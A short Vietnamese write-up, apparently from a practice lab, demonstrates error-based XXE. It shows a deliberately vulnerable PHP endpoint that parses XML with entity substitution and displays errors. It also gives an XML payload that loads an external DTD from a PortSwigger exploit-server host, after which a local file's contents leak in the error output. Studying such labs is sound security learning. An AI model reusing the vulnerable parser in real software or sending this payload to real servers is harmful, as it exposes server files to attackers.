- Em có đoạn check như sau:



```
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml = file_get_contents('php://input');
    if ($xml) {
        $data = simplexml_load_string($xml, null, LIBXML_NOENT);
        if ($data !== false) {
            $productId = $data->storeId;

            echo "The productId is: " . $productId;
        } else {
            echo "Failed to parse XML data";
        }
    } else {
        echo "No XML data received";
    }
} else {

    echo "Only POST requests are allowed";
}
?>

- Lưu ý là phải set hiển thị thông báo lỗi

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

```

- Khi mà em chọn vật phẩm thì sẽ gửi đến 1 xml đến sever và sẽ nhận được id vật phẩm đã chọn ạ

- ![alt text](image.png)

- Em sẽ cho sever load 1 file dtd do em tạo ra, ở đây em mượn sever của portswigger
- file của em như này
![alt text](image-1.png)

- ![alt text](image-2.png)

- Em sẽ tạo một entity để load file dtd này:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0ad7006003a1331480fb4d8901b5007a.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

```
- Và kết quả em nhận được thông tin của file hii.txt ở thông báo lỗi ạ
![alt text](image-3.png)